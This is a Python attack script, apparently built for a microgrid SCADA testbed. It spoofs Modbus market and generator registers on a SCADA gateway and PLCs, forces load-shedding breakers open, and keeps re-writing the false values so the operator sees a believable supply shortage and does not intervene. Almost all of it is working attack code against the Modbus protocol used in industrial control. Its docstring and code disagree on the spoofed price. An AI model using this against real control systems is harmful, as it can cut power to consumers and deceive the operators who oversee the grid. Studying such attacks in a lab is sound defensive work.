#!/usr/bin/env python3
"""
Market Manipulation Attack: False Scarcity via SCADA Gateway
=============================================================
Spoofs the SCADA gateway's market data to create a false scarcity scenario,
then forces load shedding on target microgrids. The SCADA operator sees
market data that appears to justify the shedding (no surplus, price spike,
allocations zero), so they don't intervene.

Attack chain:
  1. Read real market state from SCADA gateway (port 5020, unit 10)
  2. Enable Operator Mode (coil 12) -- gateway stops auto-writing to PLCs
  3. Spoof market registers: surplus=0, allocations=0, price=$299
  4. Set shed coils TRUE on gateway (SCADA sees "shedding recommended")
  5. Inject shed commands directly to PLCs (open bidder breakers)
  6. Continuously re-spoof registers (gateway overwrites from HELICS every 60s)
  7. Cleanup: clear operator mode, gateway resumes normal operation

Result:
  - SCADA View: "Market crisis -- no surplus, shedding in progress" (looks real)
  - God's View:  "Generation normal, surplus exists, breakers forced open" (attack!)

Architecture:
  Attacker --> SCADA Gateway (port 5020, unit 10)
               Writes false market data to registers + shed coils
               Sets Operator Mode to prevent gateway auto-writes

  Attacker --> PLCs (ports 502-505, unit 1)
               Writes Market_Control=TRUE + opens bidder breakers

  ScadaLTS reads SCADA Gateway --> sees "market crisis + legitimate shedding"
  God's View reads bridge JSON  --> sees "breakers OPEN, but market is normal"

MITRE ATT&CK ICS:
    T0830 - Man in the Middle
    T0831 - Manipulation of Control
    T0836 - Modify Parameter
    T0856 - Spoof Reporting Message
    T0813 - Denial of Control

Usage:
    # Attack all microgrids for 60 seconds
    python attacks/scada_market_attack.py --all --duration 60

    # Attack all microgrids until Ctrl+C (default duration = 0)
    python attacks/scada_market_attack.py --all

    # Reconnaissance only (read current market state)
    python attacks/scada_market_attack.py --recon

    # Restore after attack (see recovery script)
    python attacks/scada_market_recovery.py --restore
"""

import argparse
import os
import socket
import struct
import sys
import time

# Default env file location: prod.env sits one directory above this script
# on deployed VMs (e.g., /opt/powergrid/prod.env, with scripts in /opt/powergrid/attacks/).
DEFAULT_ENV_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), '..', 'prod.env'
)

# =============================================================================
# Modbus constants
# =============================================================================
FC_READ_COILS = 0x01
FC_READ_HOLDING_REGISTERS = 0x03
FC_WRITE_SINGLE_COIL = 0x05
FC_WRITE_SINGLE_REGISTER = 0x06
COIL_ON = 0xFF00
COIL_OFF = 0x0000

# SCADA Gateway
GATEWAY_PORT = 5020
GATEWAY_UNIT_ID = 10

# PLC addresses (host-mapped Docker ports, overridden by --env-file)
PLC_HOSTS = {'mg1': 'localhost', 'mg2': 'localhost', 'mg3': 'localhost', 'mg4': 'localhost'}
PLC_PORTS = {'mg1': 502, 'mg2': 503, 'mg3': 504, 'mg4': 505}
PLC_UNIT_ID = 1

# Gateway register layout (unit 10)
# Holding registers:
#   0-3:   Bidder allocations (MG1-4) in kW
#   4-7:   Bid quantities (MG1-4) in kW
#   8:     Clearing price ($/MWh * 100)
#   9:     Total surplus (kW)
#   10:    Total generation (kW)
#   11-14: Fixed loads (MG1-4) in kW
REG_ALLOC_MG1 = 0
REG_ALLOC_MG2 = 1
REG_ALLOC_MG3 = 2
REG_ALLOC_MG4 = 3
REG_BID_QTY_MG1 = 4
REG_BID_QTY_MG2 = 5
REG_BID_QTY_MG3 = 6
REG_BID_QTY_MG4 = 7
REG_CLEARING_PRICE = 8
REG_SURPLUS = 9
REG_GENERATION = 10
REG_FIXED_MG1 = 11
REG_FIXED_MG2 = 12
REG_FIXED_MG3 = 13
REG_FIXED_MG4 = 14

# Gateway coil layout (unit 10)
#   0-3:   Bidder shed recommendations (MG1-4)
#   4-7:   Market control (MG1-4)
#   8-11:  Fixed load shed recommendations (MG1-4)
#   12:    Operator_Mode
COIL_BIDDER_SHED = {'mg1': 0, 'mg2': 1, 'mg3': 2, 'mg4': 3}
COIL_OVERRIDE = {'mg1': 4, 'mg2': 5, 'mg3': 6, 'mg4': 7}
COIL_FIXED_SHED = {'mg1': 8, 'mg2': 9, 'mg3': 10, 'mg4': 11}
COIL_OPERATOR_MODE = 12

# PLC coil layout (unit 1) -- Load PLCs (MG1-3)
LOAD_PLC_COILS = {
    'Market_Control': 3,
    'Main_Cmd_Input': 4,
    'Load_Cmd_Input': 5,
    'Bidder_Cmd_Input': 6,
}
# Generator PLC (MG4)
GEN_PLC_COILS = {
    'Market_Control': 2,
    'Main_Cmd_Input': 3,
    'Gen_Cmd_Input': 4,
}

# MG4 PLC holding register addresses (unit 1)
# %MW0 -> Modbus register 1024, %MW3 -> 1027, etc.
MG4_PLC_REGS = {
    'diesel_power_A': 1027, 'diesel_power_B': 1028, 'diesel_power_C': 1029,
    'wind_power_A': 1030, 'wind_power_B': 1031, 'wind_power_C': 1032,
    'solar_power_A': 1033, 'solar_power_B': 1034, 'solar_power_C': 1035,
}

# Microgrid bid prices (from feeder config)
MG_BID_PRICES = {'mg1': 55, 'mg2': 52, 'mg3': 48, 'mg4': 35}


# =============================================================================
# Raw Modbus TCP client
# =============================================================================
class ModbusClient:
    """Raw Modbus TCP client supporting configurable unit ID."""

    def __init__(self, host, port, unit_id=1):
        self.host = host
        self.port = port
        self.unit_id = unit_id
        self.sock = None
        self.txn_id = 0

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(3.0)
            self.sock.connect((self.host, self.port))
            return True
        except socket.error as e:
            return False

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def _next_txn(self):
        self.txn_id = (self.txn_id + 1) % 65536
        return self.txn_id

    def write_coil(self, address, value):
        """Write Single Coil (FC 0x05)."""
        txn = self._next_txn()
        coil_val = COIL_ON if value else COIL_OFF
        pdu = struct.pack('>BHH', FC_WRITE_SINGLE_COIL, address, coil_val)
        header = struct.pack('>HHHB', txn, 0, len(pdu) + 1, self.unit_id)
        try:
            self.sock.sendall(header + pdu)
            resp = self.sock.recv(256)
            return resp and len(resp) >= 12 and not (resp[7] & 0x80)
        except socket.error:
            return False

    def write_register(self, address, value):
        """Write Single Register (FC 0x06)."""
        txn = self._next_txn()
        pdu = struct.pack('>BHH', FC_WRITE_SINGLE_REGISTER, address, value & 0xFFFF)
        header = struct.pack('>HHHB', txn, 0, len(pdu) + 1, self.unit_id)
        try:
            self.sock.sendall(header + pdu)
            resp = self.sock.recv(256)
            return resp and len(resp) >= 12 and not (resp[7] & 0x80)
        except socket.error:
            return False

    def read_coils(self, start, count):
        """Read Coils (FC 0x01)."""
        txn = self._next_txn()
        pdu = struct.pack('>BHH', FC_READ_COILS, start, count)
        header = struct.pack('>HHHB', txn, 0, len(pdu) + 1, self.unit_id)
        try:
            self.sock.sendall(header + pdu)
            resp = self.sock.recv(256)
            if not resp or len(resp) < 10 or (resp[7] & 0x80):
                return None
            cb = resp[9:9 + resp[8]]
            return [bool(cb[i // 8] & (1 << (i % 8))) for i in range(count)]
        except socket.error:
            return None

    def read_registers(self, start, count):
        """Read Holding Registers (FC 0x03)."""
        txn = self._next_txn()
        pdu = struct.pack('>BHH', FC_READ_HOLDING_REGISTERS, start, count)
        header = struct.pack('>HHHB', txn, 0, len(pdu) + 1, self.unit_id)
        try:
            self.sock.sendall(header + pdu)
            resp = self.sock.recv(256)
            if not resp or len(resp) < 9 or (resp[7] & 0x80):
                return None
            byte_count = resp[8]
            regs = []
            for i in range(count):
                offset = 9 + i * 2
                if offset + 2 <= len(resp):
                    regs.append(struct.unpack('>H', resp[offset:offset + 2])[0])
                else:
                    regs.append(0)
            return regs
        except socket.error:
            return None


# =============================================================================
# Market reconnaissance
# =============================================================================
def read_market_state(gw):
    """Read and display current market state from SCADA gateway."""
    regs = gw.read_registers(0, 15)
    coils = gw.read_coils(0, 13)
    if not regs or not coils:
        return None

    state = {
        'alloc_mg1': regs[0], 'alloc_mg2': regs[1],
        'alloc_mg3': regs[2], 'alloc_mg4': regs[3],
        'bid_mg1': regs[4], 'bid_mg2': regs[5],
        'bid_mg3': regs[6], 'bid_mg4': regs[7],
        'clearing_price': regs[8] / 100.0,
        'surplus': regs[9], 'generation': regs[10],
        'fixed_mg1': regs[11], 'fixed_mg2': regs[12],
        'fixed_mg3': regs[13], 'fixed_mg4': regs[14],
        'bidder_shed': {
            'mg1': coils[0], 'mg2': coils[1],
            'mg3': coils[2], 'mg4': coils[3],
        },
        'override': {
            'mg1': coils[4], 'mg2': coils[5],
            'mg3': coils[6], 'mg4': coils[7],
        },
        'fixed_shed': {
            'mg1': coils[8], 'mg2': coils[9],
            'mg3': coils[10], 'mg4': coils[11],
        },
        'operator_mode': coils[12],
    }
    return state


def print_market_state(state, label="Market State"):
    """Pretty-print market state."""
    print(f"  {label}:")
    print(f"    Clearing Price: ${state['clearing_price']:.2f}/MWh")
    print(f"    Surplus:    {state['surplus']} kW")
    print(f"    Generation: {state['generation']} kW")
    print()
    print(f"    {'MG':<5} {'Alloc':>6} {'Bid Qty':>8} {'Bid $':>6} "
          f"{'Fixed':>6} {'B.Shed':>7} {'F.Shed':>7} {'Override':>9}")
    print(f"    {'----':<5} {'-----':>6} {'-------':>8} {'-----':>6} "
          f"{'-----':>6} {'------':>7} {'------':>7} {'--------':>9}")
    for mg in ['mg1', 'mg2', 'mg3', 'mg4']:
        alloc = state[f'alloc_{mg}']
        bid_q = state[f'bid_{mg}']
        bid_p = MG_BID_PRICES[mg]
        fixed = state[f'fixed_{mg}']
        b_shed = state['bidder_shed'][mg]
        f_shed = state['fixed_shed'][mg]
        ovr = state['override'][mg]
        print(f"    {mg.upper():<5} {alloc:>5}kW {bid_q:>6}kW "
              f"${bid_p:>4}/MWh {fixed:>5}kW "
              f"{'YES' if b_shed else 'no':>7} "
              f"{'YES' if f_shed else 'no':>7} "
              f"{'TRUE' if ovr else 'false':>9}")
    print(f"    Operator Mode: {'ENABLED' if state['operator_mode'] else 'disabled'}")


# =============================================================================
# Market spoofing
# =============================================================================
def spoof_market_registers(gw, targets, total_fixed=0):
    """Write false 'scarcity' values to gateway registers.

    Sets generation = total_fixed so the numbers look balanced:
    generation ≈ fixed demand, surplus ≈ 0, bidder shedding justified.

    Returns number of successful writes.
    """
    ok_count = 0

    # Zero out allocations for target MGs
    alloc_regs = {'mg1': REG_ALLOC_MG1, 'mg2': REG_ALLOC_MG2,
                  'mg3': REG_ALLOC_MG3, 'mg4': REG_ALLOC_MG4}
    for mg in targets:
        ok_count += gw.write_register(alloc_regs[mg], 0)

    # Price spike (register is 16-bit signed, max 32767; scaled *100)
    ok_count += gw.write_register(REG_CLEARING_PRICE, 9900)  # $99/MWh

    # No surplus
    ok_count += gw.write_register(REG_SURPLUS, 0)

    # Generation = total fixed demand (just enough for essential loads)
    ok_count += gw.write_register(REG_GENERATION, total_fixed)

    return ok_count


def set_gateway_shed_coils(gw, targets):
    """Set bidder-shed recommendation coils on the gateway for the load
    microgrids (mg1-3). MG4 is the generator — it has no bidder load, so its
    bidder-shed coil is not set (setting it would be a meaningless signal)."""
    for mg in targets:
        if mg == 'mg4':
            continue
        gw.write_coil(COIL_BIDDER_SHED[mg], True)
        gw.write_coil(COIL_OVERRIDE[mg], True)


def clear_gateway_shed_coils(gw, targets):
    """Clear shed recommendation coils on gateway."""
    for mg in targets:
        gw.write_coil(COIL_BIDDER_SHED[mg], False)
        gw.write_coil(COIL_OVERRIDE[mg], False)


def inject_shed_to_plc(host, port, mg_id):
    """Open bidder breaker on a PLC via direct Modbus injection."""
    plc = ModbusClient(host, port, PLC_UNIT_ID)
    if not plc.connect():
        return False

    if mg_id == 'mg4':
        coils = GEN_PLC_COILS
    else:
        coils = LOAD_PLC_COILS

    # Enable override
    plc.write_coil(coils['Market_Control'], True)
    time.sleep(0.05)

    # Open bidder breaker (load PLCs) or gen breaker (MG4)
    if mg_id == 'mg4':
        plc.write_coil(coils['Gen_Cmd_Input'], False)
    else:
        plc.write_coil(coils['Bidder_Cmd_Input'], False)

    plc.close()
    return True


def reinject_shed_to_plc(host, port, mg_id):
    """Re-inject shed commands (beat gateway's write cycle)."""
    try:
        plc = ModbusClient(host, port, PLC_UNIT_ID)
        if not plc.connect():
            return
        if mg_id == 'mg4':
            coils = GEN_PLC_COILS
        else:
            coils = LOAD_PLC_COILS
        plc.write_coil(coils['Market_Control'], True)
        if mg_id == 'mg4':
            plc.write_coil(coils['Gen_Cmd_Input'], False)
        else:
            plc.write_coil(coils['Bidder_Cmd_Input'], False)
        plc.close()
    except Exception:
        pass


def spoof_mg4_plc_sensors(total_fixed, plc=None):
    """Write fake generation values to MG4 PLC registers.

    Sets diesel output = total_fixed / 3 per phase (just enough for fixed loads),
    wind and solar = 0 (renewables "offline").
    ScadaLTS reads these registers, so the operator sees low generation.
    Bridge overwrites every ~1s, so this must be called continuously.

    Args:
        total_fixed: total fixed demand in kW
        plc: optional existing ModbusClient connection (avoids reconnect overhead)
    """
    close_after = False
    if plc is None:
        plc = ModbusClient(PLC_HOSTS['mg4'], PLC_PORTS['mg4'], PLC_UNIT_ID)
        if not plc.connect():
            return False
        close_after = True

    per_phase = total_fixed // 3

    # Diesel covers the fixed demand (split evenly across phases)
    plc.write_register(MG4_PLC_REGS['diesel_power_A'], per_phase)
    plc.write_register(MG4_PLC_REGS['diesel_power_B'], per_phase)
    plc.write_register(MG4_PLC_REGS['diesel_power_C'], per_phase)

    # Wind and solar "offline" (no renewables)
    for key in ['wind_power_A', 'wind_power_B', 'wind_power_C',
                'solar_power_A', 'solar_power_B', 'solar_power_C']:
        plc.write_register(MG4_PLC_REGS[key], 0)

    if close_after:
        plc.close()
    return True


# =============================================================================
# Main
# =============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="Market Manipulation Attack: False Scarcity via SCADA Gateway",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Read current market state (recon only)
    python attacks/scada_market_attack.py --recon

    # Attack all microgrids for 120 seconds
    python attacks/scada_market_attack.py --all --duration 120

    # Attack all microgrids until Ctrl+C (default duration = 0)
    python attacks/scada_market_attack.py --all

    # Restore after attack (see recovery script)
    python attacks/scada_market_recovery.py --restore
        """
    )
    parser.add_argument('--all', action='store_true',
                        help='Attack all microgrids (open every bidder breaker; gen on MG4)')
    parser.add_argument('--recon', action='store_true',
                        help='Reconnaissance only: read and display market state')
    parser.add_argument('--duration', type=int, default=0,
                        help='Attack duration in seconds (0 = Ctrl+C)')
    parser.add_argument('--interval', type=float, default=1.0,
                        help='Spoof/inject interval in seconds (default: 1.0)')
    parser.add_argument('--gateway-host', default='localhost',
                        help='SCADA gateway host')
    parser.add_argument('--gateway-port', type=int, default=GATEWAY_PORT,
                        help=f'SCADA gateway Modbus port (default: {GATEWAY_PORT})')
    parser.add_argument('--plc-host', default='localhost',
                        help='PLC host (default: localhost)')
    parser.add_argument('--env-file', default=DEFAULT_ENV_FILE,
                        help=f'Load service addresses from env file (default: {DEFAULT_ENV_FILE})')
    parser.add_argument('-v', '--verbose', action='store_true')

    args = parser.parse_args()

    # Override defaults from env file (explicit CLI args take priority).
    # Silently skip if the default path doesn't exist (e.g., running from dev tree).
    if args.env_file and os.path.isfile(args.env_file):
        from env_loader import load_env_file, resolve_addresses
        addrs = resolve_addresses(load_env_file(args.env_file))
        if args.gateway_host == 'localhost':
            args.gateway_host = addrs['gateway_host']
        if args.gateway_port == GATEWAY_PORT:
            args.gateway_port = addrs['gateway_port']
        for mg, (host, port) in addrs['plc_hosts'].items():
            PLC_HOSTS[mg] = host
            PLC_PORTS[mg] = port
    elif args.plc_host != 'localhost':
        for mg in PLC_HOSTS:
            PLC_HOSTS[mg] = args.plc_host

    if not args.all and not args.recon:
        parser.print_help()
        sys.exit(1)

    targets = ['mg1', 'mg2', 'mg3', 'mg4'] if args.all else []

    # Connect to gateway
    gw = ModbusClient(args.gateway_host, args.gateway_port, GATEWAY_UNIT_ID)
    if not gw.connect():
        print(f"[-] Cannot connect to SCADA gateway "
              f"at {args.gateway_host}:{args.gateway_port}")
        sys.exit(1)

    # --recon: just read and display
    if args.recon:
        print("=" * 60)
        print("  Market Reconnaissance: SCADA Gateway (unit 10)")
        print("=" * 60)
        state = read_market_state(gw)
        if state:
            print()
            print_market_state(state, "Current Market State")
        else:
            print("  [-] Failed to read market state")
        gw.close()
        print()
        print("=" * 60)
        sys.exit(0)

    # =========================================================================
    # ATTACK MODE
    # =========================================================================
    dur_str = f"{args.duration}s" if args.duration else "indefinite (Ctrl+C)"

    print("=" * 60)
    print("  Market Manipulation Attack: False Scarcity")
    print("=" * 60)
    print(f"  Targets: {', '.join(t.upper() for t in targets)}")
    print(f"  Duration: {dur_str}")
    print(f"  Gateway: {args.gateway_host}:{args.gateway_port} (unit {GATEWAY_UNIT_ID})")
    print()

    # -------------------------------------------------------------------------
    # Phase 1: Reconnaissance
    # -------------------------------------------------------------------------
    print("[+] Phase 1: Reading current market state...")
    state = read_market_state(gw)
    if not state:
        print("    [-] Failed to read market state")
        gw.close()
        sys.exit(1)
    print()
    print_market_state(state, "Real Market State (before attack)")

    # Save original values for display
    real_price = state['clearing_price']
    real_surplus = state['surplus']
    real_gen = state['generation']

    # Compute total fixed demand — fake generation will match this
    total_fixed = (state['fixed_mg1'] + state['fixed_mg2']
                   + state['fixed_mg3'] + state['fixed_mg4'])

    # -------------------------------------------------------------------------
    # Phase 2: Enable Operator Mode
    # -------------------------------------------------------------------------
    print()
    print("[+] Phase 2: Enabling Operator Mode on gateway...")
    print("    Gateway will stop auto-writing shed commands to PLCs")
    gw.write_coil(COIL_OPERATOR_MODE, True)
    time.sleep(0.2)

    # Verify
    coils = gw.read_coils(12, 1)
    if coils and coils[0]:
        print("    [OK] Operator Mode = TRUE")
    else:
        print("    [WARN] Could not verify Operator Mode")

    # -------------------------------------------------------------------------
    # Phase 3: Spoof market data + set shed coils
    # -------------------------------------------------------------------------
    print()
    print("[+] Phase 3: Spoofing market data on gateway...")
    print("    Clearing price: $99/MWh (scarcity)")
    print("    Surplus: 0 kW (no available power)")
    print(f"    Generation: {total_fixed} kW (= total fixed demand, renewables 'offline')")
    print("    Allocations: 0 kW for target MGs")

    ok = spoof_market_registers(gw, targets, total_fixed)
    expected = len(targets) + 3  # allocs + price + surplus + gen
    print(f"    [{ok}/{expected} register writes OK]")
    time.sleep(0.2)

    print()
    print("[+] Phase 3a: Spoofing MG4 PLC generation registers...")
    print(f"    Diesel: {total_fixed // 3} kW/phase (just covers fixed loads)")
    print("    Wind: 0 kW (no wind)")
    print("    Solar: 0 kW (cloudy/night)")
    ok = spoof_mg4_plc_sensors(total_fixed)
    print(f"    [{'OK' if ok else 'FAIL'}] MG4 PLC generation registers spoofed")

    print()
    print("[+] Phase 3b: Setting shed recommendations on gateway...")
    set_gateway_shed_coils(gw, targets)
    for mg in targets:
        if mg == 'mg4':
            print(f"    [--] MG4: no bidder load (generator) — bidder_shed not set")
            continue
        print(f"    [OK] {mg.upper()}: bidder_shed=TRUE, override=TRUE")

    # -------------------------------------------------------------------------
    # Phase 4: Inject shed commands to PLCs
    # -------------------------------------------------------------------------
    print()
    print("[+] Phase 4: Injecting shed commands to PLCs...")
    # Skip MG4 — attack only spoofs its sensor registers (Phase 3a).
    # Opening MG4's gen breaker would create REAL scarcity, not false.
    plc_targets = [mg for mg in targets if mg != 'mg4']
    for mg in plc_targets:
        port = PLC_PORTS[mg]
        ok = inject_shed_to_plc(PLC_HOSTS[mg], port, mg)
        status = "OPEN" if ok else "FAILED"
        print(f"    [{mg.upper()}] Bidder_Breaker = {status}, Override = TRUE")
    if 'mg4' in targets:
        print(f"    [MG4] Skipped — sensor spoofing only (gen breaker stays closed)")

    time.sleep(0.5)

    # Verify spoofed state -- re-spoof registers first since HELICS may
    # have overwritten them during Phases 3a/3b/4 (gateway updates every 60s)
    print()
    print("[+] Phase 4b: Verifying spoofed market state...")
    spoof_market_registers(gw, targets, total_fixed)
    set_gateway_shed_coils(gw, targets)
    time.sleep(0.1)
    spoofed = read_market_state(gw)
    if spoofed:
        print()
        print_market_state(spoofed, "Spoofed Market State (what SCADA sees)")

    print()
    print("  What the SCADA operator sees:")
    print(f"    'Renewables offline, generation={total_fixed}kW ≈ fixed demand'")
    print(f"    'No surplus for bidders, price spiking to $99/MWh'")
    print(f"    'Load shedding active on {', '.join(t.upper() for t in targets)}'")
    print(f"    'Numbers check out — looks like a legitimate supply shortfall'")
    print()
    print("  Reality (God's View / market CSV):")
    print(f"    Clearing price: ${real_price:.2f}/MWh (normal)")
    print(f"    Surplus: {real_surplus} kW (available)")
    print(f"    Generation: {real_gen} kW (running fine)")
    print()
    print("  Compare:")
    print("    SCADA View  -> http://localhost:8888  (shows SCARCITY)")
    print("    God's View  -> http://localhost:8889  (shows NORMAL grid)")

    # -------------------------------------------------------------------------
    # Phase 5: Continuous spoofing + injection loop
    # -------------------------------------------------------------------------
    print()
    if args.duration:
        print(f"[+] Phase 5: Continuous attack for {args.duration}s...")
    else:
        print("[+] Phase 5: Continuous attack (Ctrl+C to stop)...")
    # MG4 PLC sensor spoofing runs at 5x the main interval to beat the
    # bridge's 1-second write cycle.  We keep persistent connections to
    # all PLCs so we don't waste time reconnecting each loop.
    sensor_interval = min(0.2, args.interval)
    print(f"    Re-spoofing gateway every {args.interval}s "
          f"(HELICS overwrites every ~60s)")
    print(f"    Re-injecting MG4 sensors every {sensor_interval}s "
          f"(bridge overwrites every ~1s)")
    print(f"    Re-injecting shed coils every {args.interval}s")

    # Open persistent PLC connections for the attack loop
    # MG4 needs connection only for sensor spoofing; load PLCs for coil injection
    plc_conns = {}
    plc_conn_targets = set(plc_targets) | ({'mg4'} if 'mg4' in targets else set())
    for mg in plc_conn_targets:
        c = ModbusClient(PLC_HOSTS[mg], PLC_PORTS[mg], PLC_UNIT_ID)
        if c.connect():
            plc_conns[mg] = c

    start_time = time.time()
    cycle = 0
    sensor_cycle = 0

    try:
        while True:
            elapsed = time.time() - start_time
            if args.duration and elapsed >= args.duration:
                break

            # Fast inner loop: spoof MG4 PLC sensors multiple times per
            # main cycle so the bridge can't overwrite them unnoticed
            writes_per_cycle = max(1, int(args.interval / sensor_interval))
            for _ in range(writes_per_cycle):
                if 'mg4' in plc_conns:
                    try:
                        spoof_mg4_plc_sensors(total_fixed, plc_conns['mg4'])
                    except Exception:
                        # Reconnect on failure
                        plc_conns['mg4'].close()
                        plc_conns['mg4'] = ModbusClient(
                            PLC_HOSTS['mg4'], PLC_PORTS['mg4'], PLC_UNIT_ID)
                        plc_conns['mg4'].connect()
                    sensor_cycle += 1
                time.sleep(sensor_interval)

            # Re-spoof gateway market registers (slower, HELICS ~60s)
            spoof_market_registers(gw, targets, total_fixed)

            # Re-inject shed coils to load PLCs (skip MG4 — sensor spoofing only)
            for mg in plc_targets:
                if mg in plc_conns:
                    try:
                        plc_conns[mg].write_coil(LOAD_PLC_COILS['Market_Control'], True)
                        plc_conns[mg].write_coil(LOAD_PLC_COILS['Bidder_Cmd_Input'], False)
                    except Exception:
                        pass

            cycle += 1
            if cycle % 10 == 0:
                ts = time.strftime('%H:%M:%S')
                remaining = ""
                if args.duration:
                    remaining = f", {int(args.duration - elapsed)}s left"
                print(f"    [{ts}] cycle={cycle}, "
                      f"sensor_writes={sensor_cycle}{remaining}", flush=True)

    except KeyboardInterrupt:
        print()
        print("  Stopped by user (Ctrl+C)")

    # Close persistent PLC connections
    for c in plc_conns.values():
        c.close()

    elapsed = time.time() - start_time
    print()
    print(f"  Attack duration: {elapsed:.1f}s")
    print(f"  Spoof/inject cycles: {cycle}")
    print(f"  MG4 sensor writes: {sensor_cycle}")

    # -------------------------------------------------------------------------
    # Phase 6: Cleanup
    # -------------------------------------------------------------------------
    print()
    print("[+] Phase 6: Cleanup...")
    print("    Clearing Operator Mode (gateway resumes auto-writes)")
    gw.write_coil(COIL_OPERATOR_MODE, False)
    print("    [OK] Operator Mode = FALSE")

    print("    Clearing shed coils...")
    clear_gateway_shed_coils(gw, targets)
    print("    [OK] Shed flags cleared")

    gw.close()

    print()
    print("  NOTE: PLC overrides may still be active. To fully restore:")
    print("    python attacks/scada_market_recovery.py --restore")

    print()
    print("=" * 60)
    print("  Attack complete")
    print("=" * 60)


if __name__ == '__main__':
    main()
